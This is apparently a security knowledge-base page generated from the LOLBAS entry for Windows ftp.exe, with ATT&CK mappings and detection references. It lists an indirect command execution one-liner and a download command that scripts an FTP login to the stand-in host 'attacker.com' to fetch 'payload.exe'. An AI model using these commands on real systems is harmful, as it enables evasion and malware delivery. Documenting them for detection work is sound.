---
title: "Ftp.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OSBinaries/Ftp.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ftp.yml"
build_date: "2026-04-27 19:14:21"
category: "OSBinaries"
aliases:
  - "Ftp.exe"
functions:
  - "Execute"
  - "Download"
attack_technique_ids:
  - "T1202"
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

A binary designed for connecting to FTP servers

## Paths

- `C:\Windows\System32\ftp.exe`
- `C:\Windows\SysWOW64\ftp.exe`

## Commands

### 1. Execute

Executes the commands you put inside the text file.

```cmd
echo !{CMD} > ftpcommands.txt && ftp -s:ftpcommands.txt
```

- Use Case: Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand
- Privileges: User
- Operating System: Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1202-indirect_command_execution|T1202: Indirect Command Execution]]

### 2. Download

Download

```cmd
cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
```

- Use Case: Spawn new process using ftp.exe. Ftp.exe downloads the binary.
- Privileges: User
- Operating System: Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Detections

- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ftp.yml
- IOC: cmd /c as child process of ftp.exe

## Resources

- {'Link': 'https://twitter.com/0xAmit/status/1070063130636640256'}
- {'Link': 'https://medium.com/@0xamit/lets-talk-about-security-research-discoveries-and-proper-discussion-etiquette-on-twitter-10f9be6d1939'}
- {'Link': 'https://ss64.com/nt/ftp.html'}
- {'Link': 'https://www.asafety.fr/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/'}

## Acknowledgements

- {'Person': 'Casey Smith', 'Handle': '@subtee'}
- {'Person': 'BennyHusted', 'Handle': ''}
- {'Person': 'Amit Serper', 'Handle': '@0xAmit'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ftp.yml)
